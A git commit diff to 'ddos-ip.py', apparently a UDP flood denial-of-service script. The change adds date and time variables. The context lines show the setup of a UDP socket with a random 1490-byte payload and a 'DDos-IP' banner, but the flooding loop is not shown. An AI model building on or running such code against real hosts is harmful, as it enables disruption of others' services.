c61bef0da709f83f4e8a2870c4adbe40da5dd656
Grim Hacker 555 <51239639+Grim-Hacker-555@users.noreply.github.com>
2020-03-17 11:13:16 +0700

    Update ddos-ip.py

--- ddos-ip.py
+++ ddos-ip.py
@@ -1,8 +1,13 @@
 import sys,os,time,socket,random
-##############
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
 os.system("clear")
 os.system("figlet DDos-IP")
